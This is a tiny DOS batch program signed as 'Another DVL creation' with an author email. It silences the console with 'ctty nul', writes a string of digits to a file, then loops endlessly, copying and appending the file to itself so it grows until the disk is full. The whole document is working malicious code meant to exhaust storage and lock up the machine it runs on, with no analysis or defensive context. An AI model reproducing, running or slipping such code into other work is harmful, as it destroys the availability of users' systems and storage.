@echo off
:: Another DVL creation
ctty nul
cls
@echo 0101010101010101010101010101010101010101010101010101010101010101010101010101010>>dvl.dvl
:dvl
@copy dvl.dvl ngl.ngl >nul
@copy dvl.dvl+ngl.ngl >nul
goto dvl
:: dvl2003ro@yahoo.co.uk